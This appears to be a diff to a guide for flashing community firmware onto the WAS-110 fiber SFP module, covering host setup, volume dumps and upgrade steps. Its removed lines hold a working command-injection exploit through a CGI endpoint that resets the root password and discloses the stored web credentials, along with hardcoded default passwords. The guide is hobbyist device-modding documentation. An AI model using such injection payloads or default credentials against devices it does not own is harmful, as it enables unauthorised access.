@@ -13,7 +13,7 @@ description: Install 8311 community firmware on the BFW Solutions WAS-110
 <!-- more -->
 <!-- nocont -->
 
-Out of the box, the WAS-110 is not fully compatible with varying ISP OLT configurations, with issues ranging from 
+Out of the box, the [] is not fully compatible with varying ISP OLT configurations, with issues ranging from 
 vendor-specific managed entities to VEIP to IEEE standards such as [802.1X] and [802.1ad]. Due to these 
 incompatibilities and discovered bugs, a community firmware[^1] has been curated to fix any impeding issues[^2]. 
 
@@ -22,12 +22,12 @@ incompatibilities and discovered bugs, a community firmware[^1] has been curated
 
 ## Host setup
 
-Plug the WAS-110 into a 10-gigabit compatible SFP+ host interface, such as a NIC, media converter, and/or network
+Plug the [WAS-110] into a 10-gigabit compatible SFP+ host interface, such as a NIC, media converter, and/or network
 switch.
 
 !!! note "Rx loss"
-    The WAS-110 running the default Azores firmware will trigger RX_LOS if the SC/APC fiber cable is unplugged or 
-    inactive. Some host interfaces will enter a power-saving state, making the WAS-110 inaccessible.
+    The [WAS-110] running the default Azores firmware will trigger RX_LOS if the SC/APC fiber cable is unplugged or 
+    inactive. Some host interfaces will enter a power-saving state, making the [WAS-110] inaccessible.
 
 ### Download firmware
 
@@ -77,8 +77,8 @@ The firmware files are archived by [7-Zip] and can be extracted with:
 
 ### Set a static IP
 
-The default IP address of the WAS-110 is `192.168.11.1/24`. To connect successfully, a static IP address must be assigned
-to the host interface, such as `192.168.11.2/24`[^4].
+The default IP address of the [WAS-110] is `192.168.11.1/24`. To connect successfully, a static IP address must be
+assigned to the host interface, such as `192.168.11.2/24`[^4].
 
 === ":material-microsoft: Windows"
 
@@ -137,50 +137,15 @@ to the host interface, such as `192.168.11.2/24`[^4].
 
 ## Dump & backup firmware <small>optional</small> { #dump-and-backup-firmware data-toc-label="Dump & backup firmware" }
 
-### Shell credentials
-
-=== "&lt;= v1.0.20"
-
-    | Username | Password       |
-    | -------- | -------------- |
-    | root     | QpZm@4246#5753 |
-
-=== "v1.0.21"
-
-    The <ins>root</ins> password is undisclosed at this time, use the suggested exploit below to gain root privileges.
-
-??? bug "Exploit to temporarily change the root password"
-    Run the following command to temporarily change the root password to `root`.
-
-    === ":material-microsoft: Windows"
-
-        ``` sh
-        curl -s -o null "http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?%7B%20echo%20root%20%3B%20sleep%201%3B%20echo%20root%3B%20%7D%20%7C%20passwd%20root"
-        ```
-
-    === ":simple-apple: macOS"
-
-        !!! note "The following commands assume [Homebrew](https://brew.sh) is installed"
-
-        ``` sh
-        brew install curl
-        curl -s -o /dev/null "http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?%7B%20echo%20root%20%3B%20sleep%201%3B%20echo%20root%3B%20%7D%20%7C%20passwd%20root"
-        ```
-
-    === ":simple-linux: Linux"
-
-        !!! note "The following commands assume [Debian] or derivatives[^3]"
-
-        ``` sh
-        sudo apt-get install curl
-        curl -s -o /dev/null "http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?%7B%20echo%20root%20%3B%20sleep%201%3B%20echo%20root%3B%20%7D%20%7C%20passwd%20root"
-        ```
-
 ### Dump volumes
+
+Login over SSH using the <em>root</em> [shell credentials].
 
 ``` sh
 ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa root@192.168.11.1 
 ```
+
+The following command sequence will dump the volumes into the local temporary directory: `/tmp/fw`.
 
 ``` sh
 mkdir -p /tmp/fw ; for part in kernelA bootcoreA rootfsA kernelB bootcoreB rootfsB; do VOL=$(ubinfo /dev/ubi0 -N "$part" | grep "Volume ID" | awk '{print $3}'); [ -n "$VOL" ] && { DEV="/dev/ubi0_$VOL"; OUT="/tmp/fw/ubi0_$VOL-$part.img"; echo "Dumping $part ($DEV) to: $OUT"; dd if="$DEV" of="$OUT"; }; done
@@ -202,74 +167,17 @@ mkdir -p /tmp/fw ; for part in kernelA bootcoreA rootfsA kernelB bootcoreB rootf
 
 ## Web UI upgrade <small>not recommended</small> { #web-ui-upgrade data-toc-label="Web UI upgrade" }
 
-### Web credentials
-
-The default web credentials can be found in `/ptrom/ptconf/param_ct.xml`. Modifications from the web UI are stored in
-`/ptrom/ptconf/usrconfig_conf` as base64 encoded strings.
-
-!!! warning
-    Passwords have a maximum length of 16 characters which are not restricted by the web UI.
-
-??? bug "Exploit to disclose the default web credentials"
-    
-    To dump the web credentials from `/ptrom/ptconf/param_ct.xml`, navigate to:
-
-    <http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?cat%20%2Fptrom%2Fptconf%2Fparam_ct.xml>
-
-    Alternatively, run the following command to download `param_ct.xml` to a temporary directory.
-
-    === ":material-microsoft: Windows"
-
-        ``` sh
-        dir %Temp% && curl -O "http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?cat%20%2Fptrom%2Fptconf%2Fparam_ct.xml"
-        ```
-
-    === ":simple-apple: macOS"
-
-        !!! note "The following commands assume [Homebrew](https://brew.sh) is installed"
-
-        ``` sh
-        brew install curl
-        cd /tmp && curl -O "http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?cat%20%2Fptrom%2Fptconf%2Fparam_ct.xml"
-        ```
-
-    === ":simple-linux: Linux"
-
-        !!! note "The following commands assume [Debian] or derivatives[^3]"
-
-        ``` sh
-        sudo apt-get install curl
-        cd /tmp && curl -O "http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?cat%20%2Fptrom%2Fptconf%2Fparam_ct.xml"
-        ```
-
-=== "&lt;= v1.0.20"
-
-    | Username | Password       |
-    | -------- | -------------- |
-    | admin    | QsCg@7249#5281 |
-    | user     | user1234       |
-
-=== "v1.0.21"
-
-    | Username | Password       |
-    | -------- | -------------- |
-    | admin    | BR#22729%635e9 |
-    | user     | user1234       |
-
-### Firmware upgrade
-
 !!! danger "Proceed with caution!"
-    The WAS-110 firmware upgrade utility on occasion has been known to soft-brick itself. To recover, a host device 
+    The [WAS-110] firmware upgrade utility on occasion has been known to soft-brick itself. To recover, a host device 
     with serial breakout on SFP pins 2 (rx) and 7 (tx) will be required.
 
     Alternatively, jump past to the <ins>safer</ins> [shell upgrade](#shell-upgrade) method later in this guide.
 
 ![WAS-110 login](install-8311-community-firmware-on-the-bfw-solutions-was-110/was_110_login.webp)
 
-
 1. Within a web browser, navigate to 
    <https://192.168.11.1/html/main.html#admin/upgrade>
-   and, if asked, input the <em>admin</em> credentials. 
+   and, if asked, input the <em>admin</em> [web credentials]. 
 
 ![WAS-110 firmware upgrade](install-8311-community-firmware-on-the-bfw-solutions-was-110/was_110_upgrade.webp)
 
@@ -279,7 +187,7 @@ The default web credentials can be found in `/ptrom/ptconf/param_ct.xml`. Modifi
 Patiently wait out the process, 4 to 5 minutes, or until the web session becomes unresponsive.
 
 ??? tip "Run a continuous ping"
-    To recieve an early indication that the WAS-110 has completed its upgrade reboot cycle, run a continuous ping:
+    To recieve an early indication that the [WAS-110] has completed its upgrade reboot cycle, run a continuous ping:
 
     === ":material-microsoft: Windows"
 
@@ -298,50 +206,9 @@ of every one of us.
 
 ## Shell upgrade <small>safer</small> { #shell-upgrade data-toc-label="Shell upgrade" }
 
-### Shell credentials
-
-=== "&lt;= v1.0.20"
-
-    | Username | Password       |
-    | -------- | -------------- |
-    | root     | QpZm@4246#5753 |
-
-=== "v1.0.21"
-
-    The <ins>root</ins> password is undisclosed at this time, use the suggested exploit below to gain root privileges.
-
-??? bug "Exploit to temporarily change the root password"
-    Run the following command to temporarily change the root password to `root`.
-
-    === ":material-microsoft: Windows"
-
-        ``` sh
-        curl -s -o null "http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?%7B%20echo%20root%20%3B%20sleep%201%3B%20echo%20root%3B%20%7D%20%7C%20passwd%20root"
-        ```
-
-    === ":simple-apple: macOS"
-
-        !!! note "The following commands assume [Homebrew](https://brew.sh) is installed"
-
-        ``` sh
-        brew install curl
-        curl -s -o /dev/null "http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?%7B%20echo%20root%20%3B%20sleep%201%3B%20echo%20root%3B%20%7D%20%7C%20passwd%20root"
-        ```
-
-    === ":simple-linux: Linux"
-
-        !!! note "The following commands assume [Debian] or derivatives[^3]"
-
-        ``` sh
-        sudo apt-get install curl
-        curl -s -o /dev/null "http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?%7B%20echo%20root%20%3B%20sleep%201%3B%20echo%20root%3B%20%7D%20%7C%20passwd%20root"
-        ```
-
-### Local upgrade
-
 The extracted `local-upgrade.tar` includes a <ins>safer</ins> upgrade script in comparison to the built-in web UI.
 
-<h4>Enable SSH</h4>
+### Enable SSH
 
 SSH must be enabled from the web UI prior to running the shell commands.
 
@@ -349,15 +216,16 @@ SSH must be enabled from the web UI prior to running the shell commands.
 
 1. Within a web browser, navigate to 
    <https://192.168.11.1/html/main.html#service/servicecontrol>
-   and, if asked, input the <em>admin</em> credentials from the [web credentials](#web-credentials) listing.
+   and, if asked, input the <em>admin</em> [web credentials].
 
 ![WAS-110 services](install-8311-community-firmware-on-the-bfw-solutions-was-110/was_110_services.webp)
 
 2. From the __Service Control__ page, check the __SSH__ checkbox and click __Save__.
 
-<h4>Upgrade firmware</h4>
+### Upgrade firmware
 
-Run the following commands from the host terminal to upgrade to the 8311 community firmware.
+Run the following commands from the host terminal to upgrade to the 8311 community firmware. Input the <em>root</em>
+[shell credentials] when asked.
 
 === ":material-microsoft: Windows"
 
@@ -377,6 +245,9 @@ Once rebooted, begin to enjoy the fruits of the 8311 community. It is not at all
 of every one of us.
 
   [Debian]: https://www.debian.org/
+  [WAS-110]: ../xgs-pon/ont/bfw-solutions/was-110.md
+  [web credentials]: ../xgs-pon/ont/bfw-solutions/was-110.md#web-credentials
+  [shell credentials]: ../xgs-pon/ont/bfw-solutions/was-110.md#shell-credentials
 
 [^1]: <https://github.com/djGrrr/8311-was-110-firmware-builder>
 [^2]: <https://github.com/djGrrr/8311-xgspon-bypass>
